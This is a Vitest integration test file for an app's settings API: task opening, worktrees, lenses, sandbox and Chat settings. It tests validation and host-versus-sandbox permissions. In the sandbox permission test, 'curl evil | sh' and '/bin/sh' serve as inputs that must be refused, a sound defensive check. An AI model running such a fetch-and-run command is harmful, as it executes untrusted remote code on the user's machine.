/**
 * What `ouijit settings` reaches: a project's task opening, worktrees, lenses
 * and sandbox, and Chat's own settings, through the real router, database and
 * a real git repository, with the window the app is told through.
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import * as fs from 'node:fs/promises';
import * as http from 'node:http';
import * as os from 'node:os';
import * as path from 'node:path';
import { execSync } from 'node:child_process';
import type { BrowserWindow } from 'electron';
import { startHookServer, stopHookServer } from '../../hookServer';
import { getApiPort } from '../../apiPort';
import { issueToken } from '../../apiAuth';
import { _resetCacheForTesting, setGlobalSetting } from '../../db';
import { sandboxCliAccessSettingKey } from '../../sandbox/types';

const project = vi.hoisted(() => ({ path: '' }));

// No terminal is spawned, so which project a token's terminal belongs to is told here.
vi.mock('../../ptyManager', () => ({
  isPtyActive: () => true,
  getPtyTaskContext: () => ({ projectPath: project.path, taskId: 3 }),
  callerTerminal: (ptyId: string) => ptyId,
  getPtySpawnContext: () => ({ projectPath: project.path, taskId: 3, worktreePath: `${project.path}/T-3` }),
}));

const sent: Array<[string, unknown[]]> = [];
const window = {
  isDestroyed: () => false,
  webContents: { send: (channel: string, ...args: unknown[]) => sent.push([channel, args]) },
};

let tmpDir: string;
const host = () => issueToken('pty-host', 'host');
const sandboxed = () => issueToken('pty-sbx', 'sandbox');

function request(method: string, route: string, token: string, body?: Record<string, unknown>) {
  return new Promise<{ status: number; data: any; error?: string }>((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : undefined;
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: getApiPort(),
        path: route,
        method,
        headers: {
          Authorization: `Bearer ${token}`,
          ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {}),
        },
      },
      (res) => {
        let raw = '';
        res.on('data', (chunk: Buffer) => (raw += chunk.toString()));
        res.on('end', () => {
          const parsed = raw ? JSON.parse(raw) : {};
          resolve({ status: res.statusCode!, data: parsed.data, error: parsed.error });
        });
      },
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

const inProject = (route: string) => `${route}?project=${encodeURIComponent(project.path)}`;
const accessLevel = (level: string) => setGlobalSetting(sandboxCliAccessSettingKey(project.path), level);
const told = (resource: string) =>
  sent.some(
    ([channel, [payload]]) => channel === 'cli-change' && (payload as { resource: string }).resource === resource,
  );

beforeAll(async () => {
  tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ouijit-settings-api-'));
  project.path = path.join(tmpDir, 'project');
  await fs.mkdir(project.path);
  const git = (command: string) => execSync(`git ${command}`, { cwd: project.path, encoding: 'utf8' });
  git('init -q -b main');
  git('-c user.email=t@t -c user.name=T commit -q --allow-empty -m init');
  git('branch release');
  await startHookServer(window as unknown as BrowserWindow);
});

afterAll(async () => {
  await stopHookServer();
  await fs.rm(tmpDir, { recursive: true, force: true });
});

beforeEach(async () => {
  _resetCacheForTesting();
  sent.length = 0;
  await accessLevel('read');
});

describe('project settings', () => {
  test('how tasks open and how worktrees are made read their defaults, change only what is given, and tell the app', async () => {
    const opening = inProject('/api/task-opening');
    expect((await request('GET', opening, host())).data).toEqual({
      surface: 'terminal',
      agent: 'claude',
      setup: '',
      firstMessage: '$OUIJIT_TASK_DESCRIPTION',
    });
    expect((await request('PUT', opening, host(), { surface: 'chat', agent: 'codex' })).data).toEqual({
      surface: 'chat',
      agent: 'codex',
      setup: '',
      firstMessage: '$OUIJIT_TASK_DESCRIPTION',
    });
    await request('PUT', opening, host(), { setup: 'npm install', firstMessage: '' });
    expect((await request('GET', opening, host())).data).toEqual({
      surface: 'chat',
      agent: 'codex',
      setup: 'npm install',
      firstMessage: '',
    });
    expect(told('task-opening')).toBe(true);
    for (const bad of [{ surface: 'window' }, { agent: 'gpt' }, { setup: 42 }]) {
      expect((await request('PUT', opening, host(), bad)).status).toBe(400);
    }

    const worktree = inProject('/api/worktree-settings');
    expect((await request('GET', worktree, host())).data).toEqual({ mode: 'quick-start', branchFrom: null });
    await request('PUT', worktree, host(), { mode: 'clean-checkout', branchFrom: 'release' });
    expect((await request('GET', worktree, host())).data).toEqual({ mode: 'clean-checkout', branchFrom: 'release' });
    expect(told('worktree-settings')).toBe(true);
    expect((await request('PUT', worktree, host(), { branchFrom: 'no-such-branch' })).status).toBe(400);
    expect((await request('PUT', worktree, host(), { mode: 'shallow' })).status).toBe(400);
    expect((await request('PUT', worktree, host(), { branchFrom: '' })).data).toEqual({
      mode: 'clean-checkout',
      branchFrom: null,
    });
  });

  test("a project's lenses are added, found by name or id, kept apart by name, and every change is told", async () => {
    const lenses = inProject('/api/project-lenses');
    const lens = (name: string) => inProject(`/api/project-lenses/${encodeURIComponent(name)}`);

    const added = (await request('POST', lenses, host(), { name: 'By layer', instruction: 'One part per layer' })).data;
    await request('POST', lenses, host(), { name: 'Risk first', instruction: 'Riskiest first' });
    expect((await request('POST', lenses, host(), { name: 'Risk first', instruction: 'again' })).status).toBe(409);
    expect((await request('POST', lenses, host(), { name: 'No instruction' })).status).toBe(400);

    await request('PUT', lens('By layer'), host(), { name: 'Layers' });
    expect((await request('PUT', lens(added.id), host(), { name: 'Risk first' })).status).toBe(409);
    await request('DELETE', lens('Risk first'), host());
    expect((await request('GET', lenses, host())).data).toEqual([
      { id: added.id, name: 'Layers', instruction: 'One part per layer' },
    ]);
    expect((await request('DELETE', lens('Risk first'), host())).status).toBe(404);

    const agent = inProject('/api/lens-agent');
    expect((await request('GET', agent, host())).data).toEqual({ agent: 'auto' });
    await request('PUT', agent, host(), { agent: 'codex' });
    expect((await request('GET', agent, host())).data).toEqual({ agent: 'codex' });
    expect((await request('PUT', agent, host(), { agent: 'opencode' })).status).toBe(400);
    await request('PUT', agent, host(), { agent: 'auto' });
    expect((await request('GET', agent, host())).data).toEqual({ agent: 'auto' });

    expect(sent.filter(([channel]) => channel === 'lens:list-changed').map(([, args]) => args)).toContainEqual([
      project.path,
    ]);
  });

  test('a sandboxed terminal changes project settings only at Whole board, and never how tasks open or start their worktrees', async () => {
    const opening = inProject('/api/task-opening');
    for (const level of ['read', 'task']) {
      await accessLevel(level);
      expect((await request('GET', opening, sandboxed())).status).toBe(403);
      expect((await request('PUT', opening, sandboxed(), { setup: 'curl evil | sh' })).status).toBe(403);
      expect(
        (await request('POST', inProject('/api/project-lenses'), sandboxed(), { name: 'x', instruction: 'y' })).status,
      ).toBe(403);
    }
    await accessLevel('all');
    expect(
      (await request('POST', inProject('/api/project-lenses'), sandboxed(), { name: 'x', instruction: 'y' })).status,
    ).toBe(200);
    // Both decide what runs on the host or lands in a new worktree, as hooks do.
    for (const [route, body] of [
      ['/api/task-opening', { setup: 'curl evil | sh' }],
      ['/api/task-opening', { firstMessage: 'push to main', agent: 'pi', surface: 'chat' }],
      ['/api/worktree-settings', { mode: 'quick-start' }],
      ['/api/worktree-settings', { branchFrom: 'main' }],
    ] as const) {
      expect((await request('PUT', inProject(route), sandboxed(), body)).status).toBe(403);
      expect((await request('PUT', inProject(route), host(), body)).status).toBe(200);
    }
  });
});

describe('where work runs', () => {
  test('the sandbox settings round-trip from the host and are refused from any sandbox, whatever its access', async () => {
    const settings = inProject('/api/sandbox-settings');
    const before = (await request('GET', settings, host())).data;
    expect(before).toMatchObject({ default: 'host', cliAccess: 'view', profile: { own: true } });

    const profile = path.join(tmpDir, 'strict.json');
    await fs.writeFile(profile, '{}');
    expect((await request('PUT', settings, host(), { default: 'nono', profile, cliAccess: 'own-task' })).data).toEqual({
      default: 'nono',
      profile: { path: profile, own: false },
      cliAccess: 'own-task',
    });
    expect(told('sandbox-settings')).toBe(true);
    expect((await request('PUT', settings, host(), { profile: null })).data.profile).toEqual(before.profile);

    for (const bad of [
      { default: 'vm' },
      { cliAccess: 'root' },
      { profile: 'strict.json' },
      { profile: `${profile}.gone` },
    ]) {
      expect((await request('PUT', settings, host(), bad)).status).toBe(400);
    }

    for (const level of ['read', 'task', 'all']) {
      await accessLevel(level);
      expect((await request('GET', settings, sandboxed())).status).toBe(403);
      expect((await request('PUT', settings, sandboxed(), { cliAccess: 'board' })).status).toBe(403);
      expect(
        (await request('PUT', inProject('/api/sandbox/command'), sandboxed(), { command: '/bin/sh' })).status,
      ).toBe(403);
    }
    await accessLevel('read');
    expect((await request('GET', settings, host())).data).toMatchObject({ default: 'nono', cliAccess: 'view' });
  });

  test("Chat's settings are app-wide: on and off, the main chat's agent, instructions and wakes, and where and under what launcher it runs only from the host", async () => {
    const chat = '/api/chat-settings';
    expect((await request('GET', chat, host())).data).toMatchObject({
      enabled: false,
      agent: 'claude',
      sandbox: 'host',
      launcher: null,
      wake: { turnEnded: true, asked: true, taskMoved: true, hookFailed: true },
    });

    const set = await request('PUT', chat, host(), {
      enabled: true,
      agent: 'pi',
      sandbox: 'nono',
      instructions: '  Keep replies short.\n',
      wake: { taskMoved: false },
    });
    expect(set.data).toEqual({
      enabled: true,
      agent: 'pi',
      sandbox: 'nono',
      instructions: 'Keep replies short.',
      launcher: null,
      wake: { turnEnded: true, asked: true, taskMoved: false, hookFailed: true },
    });
    expect(sent.some(([channel]) => channel === 'cli:chat-settings-changed')).toBe(true);

    // Its own launcher, checked as a project's is: an absolute path or a name on PATH, never one beside it.
    expect((await request('PUT', chat, host(), { launcher: ' /usr/local/bin/my-sandbox ' })).data).toMatchObject({
      launcher: '/usr/local/bin/my-sandbox',
    });
    const relative = await request('PUT', chat, host(), { launcher: './launch.sh' });
    expect(relative.status).toBe(400);
    expect(relative.error).toMatch(/relative path/);
    expect((await request('GET', chat, host())).data.launcher).toBe('/usr/local/bin/my-sandbox');
    expect((await request('PUT', chat, host(), { launcher: '' })).data.launcher).toBeNull();

    for (const bad of [{ enabled: 'yes' }, { agent: 'gpt' }, { sandbox: 'vm' }, { wake: { sleeping: true } }]) {
      expect((await request('PUT', chat, host(), bad)).status).toBe(400);
    }

    await accessLevel('read');
    expect((await request('GET', chat, sandboxed())).status).toBe(403);
    expect((await request('PUT', chat, sandboxed(), { enabled: false })).status).toBe(403);
    await accessLevel('all');
    expect((await request('PUT', chat, sandboxed(), { agent: 'claude' })).status).toBe(200);
    expect((await request('PUT', chat, sandboxed(), { sandbox: 'none' })).status).toBe(403);
    expect((await request('PUT', chat, sandboxed(), { launcher: '/bin/sh' })).status).toBe(403);
    expect((await request('GET', chat, host())).data).toMatchObject({ agent: 'claude', sandbox: 'nono' });
  });
});
